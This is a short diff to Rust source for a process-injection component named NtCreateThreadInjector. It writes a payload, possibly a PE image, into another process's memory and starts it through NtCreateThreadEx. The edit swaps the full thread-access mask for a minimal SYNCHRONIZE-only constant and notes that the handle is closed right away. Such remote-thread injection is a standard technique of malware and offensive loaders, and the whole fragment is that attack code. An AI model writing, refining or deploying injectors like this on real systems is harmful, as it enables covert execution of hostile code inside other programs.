@@ -21,8 +21,11 @@ impl Injector for NtCreateThreadInjector {
         use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
         use winapi::um::winnt::{
             PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
-            PROCESS_VM_WRITE,
+            PROCESS_VM_WRITE, SYNCHRONIZE,
         };
+        // Minimal thread access for NtCreateThreadEx: SYNCHRONIZE only.
+        // The handle is closed immediately after creation (fire-and-forget).
+        const THREAD_ACCESS_MINIMAL: u32 = SYNCHRONIZE;
 
         let is_pe = payload_has_valid_pe_headers(payload);
         if is_pe {
@@ -160,7 +163,7 @@ impl Injector for NtCreateThreadInjector {
             let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
             let status = nt_create_thread(
                 &mut h_thread,
-                0x1FFFFF,
+                THREAD_ACCESS_MINIMAL,
                 std::ptr::null_mut(),
                 h_proc,
                 remote_mem,
